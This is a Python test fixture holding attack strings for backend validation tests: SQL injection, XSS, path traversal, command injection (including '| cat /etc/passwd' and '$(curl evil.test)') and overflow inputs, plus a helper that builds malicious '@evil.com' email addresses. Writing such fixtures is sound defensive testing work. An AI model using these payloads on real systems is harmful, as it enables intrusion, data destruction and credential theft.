"""Attack strings for backend validation tests — mirrors src/lib/__tests__/fixtures/malicious-payloads.ts."""

SQL_INJECTION = [
    "' OR '1'='1",
    "1; DROP TABLE users;--",
    "Robert'); DROP TABLE students;--",
    "' UNION SELECT NULL, username, password FROM users--",
    "admin'--",
    "1' OR '1' = '1",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><svg/onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
]

PATH_TRAVERSAL = [
    "../../etc/passwd",
    "..\\..\\windows\\system32",
    "%2e%2e%2fetc%2fpasswd",
]

COMMAND_INJECTION = [
    "; ls -la",
    "| cat /etc/passwd",
    "`whoami`",
    "$(curl evil.test)",
]

STRICT_FIELD_ATTACKS = SQL_INJECTION + XSS_PAYLOADS + PATH_TRAVERSAL + COMMAND_INJECTION

OVERFLOW = ["a" * 10_000, "9" * 500]

KNOWN_NAME_FORMAT_PASSES = ["admin'--"]


def malicious_emails() -> list[str]:
    return [f"{payload}@evil.com" for payload in STRICT_FIELD_ATTACKS]
